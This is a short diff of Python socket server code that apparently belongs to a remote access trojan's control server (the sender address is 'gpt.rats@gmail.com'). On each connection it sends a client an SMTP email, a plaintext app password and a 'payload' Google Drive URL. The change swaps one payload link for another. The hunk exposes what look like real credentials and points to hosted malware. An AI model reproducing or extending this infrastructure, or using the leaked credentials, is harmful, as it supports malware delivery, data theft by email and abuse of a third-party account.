@@ -30,7 +30,7 @@ with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
             credentials = {}
             credentials['smtp_email'] = "gpt.rats@gmail.com"
             credentials['smtp_password'] = "mmtxdnfzzvckqrhw"
-            payload_URL = "https://drive.google.com/file/d/19yVYnI6jbrRainkkQyNiV9DBmUa1EGpd/view?usp=sharing"
+            payload_URL = "https://drive.google.com/file/d/1XQlT8IfF-VtsYDaYW9obzsPadXtHRmhX/view?usp=sharing"
             conn.send(credentials['smtp_email'].encode() + b"\n" + credentials['smtp_password'].encode() + b"\n" + payload_URL.encode())
             break
         print("Server connection closed")
